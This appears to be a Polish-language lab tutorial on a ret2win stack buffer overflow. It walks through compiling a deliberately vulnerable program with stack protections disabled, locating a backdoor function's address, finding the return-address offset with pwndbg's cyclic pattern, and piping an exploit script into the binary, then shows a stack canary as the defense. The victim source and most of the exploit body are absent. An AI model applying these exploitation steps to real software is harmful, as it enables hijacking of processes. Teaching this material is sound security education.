### Temat: "Smashing the Stack – Przejęcie kontroli nad procesem"

Zadanie typu **Ret2Win** (Return to Win). 
Nie wstrzykujemy własnego kodu (Shellcode), tylko wykorzystujemy istniejący kod wbrew intencjom programisty.

#### Krok A: Podatny Kod (victim.c)

#### Krok B: Kompilacja (Wyłączamy zabezpieczenia)

```bash
gcc -fno-stack-protector -no-pie -z execstack victim.c -o victim
```
*   `-fno-stack-protector`: Wyłącza "Kanarka" (Canary) – strażnika stosu.
*   `-no-pie`: Wyłącza losowość adresów kodu (adres funkcji `secret_backdoor` będzie stały).

### 3. Przebieg ataku

#### Faza 1: Rekonesans (Gdzie jest cel?)
Musimy wiedzieć, pod jakim adresem w pamięci znajduje się funkcja `secret_backdoor`.

```bash
objdump -d victim | grep secret_backdoor
```
Wynik np.: `0000000000401146 <secret_backdoor>:`
Zapisujemy adres: **`0x401146`**.

#### Faza 2: Sabotaż (Gdzie jest punkt wejścia?)
Uruchamiamy GDB, żeby zobaczyć, ile śmieci musimy wpisać, żeby dojść do adresu powrotu.

1.  `gdb ./victim`
2.  Generujemy cykliczny wzorzec (unikalny ciąg znaków), żeby wiedzieć, który fragment nadpisał pamięć. W Pwndbg: `cyclic 100`.
3.  `run` -> Wklejamy 100 znaków.
4.  **CRASH!** Program dostanie `SEGFAULT`.
5.  Patrzymy na rejestr `RIP` (Instruction Pointer). Będzie zawierał fragment naszego wzorca (np. `0x6161616c` -> 'laaa').

W architekturze x86-64, w momencie wykonywania instrukcji `ret` (return), procesor pobiera adres powrotu ze szczytu stosu (tam, gdzie wskazuje `RSP`).

```text
00:0000│ rsp 0x7fffffffe5b8 ◂— 'saaataaauaaavaaawaaaxaaayaaa'
```

```bash
cyclic -l saaa
```

*(Wystarczą pierwsze 4 znaki z tego, co leży pod `rsp`).*

Powinno zwrócić liczbę, prawdopodobnie **72**.


#### Faza 3: Exploit (Python)

```python
# Adres funkcji secret_backdoor (w Little Endian!)
# 0x0000000000401146 -> \x46\x11\x40\x00\x00\x00\x00\x00
```

Uruchomienie ataku:
```bash
python3 exploit.py | ./victim
```

---

### 4. Obrona (Low-Level Defense)


#### A. Stack Canary (Kanarek)
Kompilujemy bez flagi `-fno-stack-protector` (domyślnie włączone w GCC).

```bash
gcc -no-pie victim.c -o victim_protected
python3 exploit.py | ./victim_protected
```

